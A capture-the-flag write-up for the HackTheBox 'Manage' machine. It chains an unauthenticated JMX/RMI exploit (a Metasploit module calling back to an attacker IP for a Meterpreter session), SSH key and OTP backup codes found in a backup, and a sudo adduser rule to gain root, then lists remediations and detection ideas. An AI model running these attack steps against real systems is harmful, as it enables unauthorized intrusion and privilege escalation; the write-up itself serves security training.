# Manage — HTB Easy, Linux

**By d4rkgunn3r / Dylan Senez — Authorized laboratory assessment**

**Attack path:** exposed JMX/RMI → unauthenticated remote code execution → backup archive → SSH key + OTP backup code → SSH as `useradmin` → sudo `adduser` abuse → root

> **Colour key:** **ATTACKER** blocks run on your host. **TARGET** blocks run inside the HTB machine once you have a shell.

### Reproducibility notes

- Secrets, OTP values, private-key material, and flag contents are intentionally redacted.
- Tomcat default-credential testing in the private notes was a hypothesis and is omitted from this confirmed path.

---

## 02 — Scope

| Field | Detail |
| --- | --- |
| Machine | Manage / HTB, Easy, Linux |
| Target IP (recorded run) | `10.129.234.57` |
| Starting access | Unauthenticated |
| Confirmed services | SSH/22, Java RMI/JMX/2222, Tomcat/8080, Java RMI/44227 |
| Objective | Obtain user and root proof in the authorized HTB lab |

## 03 — External recon & service discovery

**ATTACKER**

```bash
nmap -sV -sC -p- 10.129.234.57 -T4 --min-rate 5000 -oA Manage
```

The decisive observation was the JMX registry on 2222 exposing a `jmxrmi` endpoint.

## 04 — JMX/RMI foothold

**ATTACKER**

```text
msfconsole
use exploit/multi/misc/java_jmx_server
set RHOSTS 10.129.234.57
set RPORT 2222
set LHOST <ATTACKER_IP>
run
```

The JMX handshake succeeded and an MLet payload produced a Meterpreter session in the JVM context.

**TARGET**

```bash
whoami
hostname
id
pwd
```

## 05 — Backup discovery

Filesystem enumeration identified:

```text
/home/useradmin/backups/backup.tar.gz
```

The archive contained an SSH private key and Google Authenticator recovery material for `useradmin`. The public copy intentionally excludes all private-key, OTP-secret, and recovery-code values.

## 06 — SSH as useradmin

**ATTACKER**

```bash
ssh -i id_ed25519 useradmin@10.129.234.57
# Supply one recovered one-time backup code when prompted.
```

**TARGET**

```bash
whoami
id
sudo -l
```

Relevant sudo rule:

```text
(ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$
```

## 07 — Privilege escalation

**TARGET**

```bash
sudo /usr/sbin/adduser admin
su admin
sudo -l
sudo su
whoami
id
```

The lab configuration granted the newly created account unrestricted sudo, producing `uid=0(root)`.

## 08 — User & root proof

```bash
cat /opt/tomcat/user.txt
cat /root/root.txt
```

Flag contents are omitted.

## 09 — Vulnerability summary & remediation

| # | Finding | Asset | Rating |
| --- | --- | --- | --- |
| 1 | Unauthenticated JMX/RMI permits remote code execution | TCP/2222 | Critical |
| 2 | Backup archive exposes SSH and MFA recovery material | `useradmin` backup | High |
| 3 | Over-broad sudo permission on `adduser` enables root | sudoers | Critical |

### Remediations

- Disable remote JMX when it is not required; otherwise bind it to a management interface and require authentication plus TLS.
- Restrict RMI/JMX ports with host and network ACLs.
- Never store SSH private keys, OTP seeds, or recovery codes in plaintext backups.
- Encrypt backups and limit backup access to a dedicated service account.
- Remove the `adduser` sudo rule or replace it with a narrowly scoped administrative workflow.

## 10 — Detection opportunities

- Inbound JMX/RMI sessions from non-management hosts.
- Process creation from the Java/Tomcat process tree.
- Reads of backup archives followed by SSH authentication.
- `sudo` execution of `/usr/sbin/adduser`.
- New local user creation followed immediately by privileged shell activity.

## 11 — Timeline

1. Nmap identified SSH, JMX/RMI, and Tomcat.
2. JMX on 2222 was validated as unauthenticated and exploited.
3. A backup archive exposed an SSH key and MFA recovery material.
4. SSH access was established as `useradmin`.
5. `sudo -l` exposed the permitted `adduser` command.
6. A lab user was created and used to obtain root.
7. User and root proof files were collected.

**Publication note:** passwords, OTP values, private keys, tokens, and flag values have been removed from this shared copy.
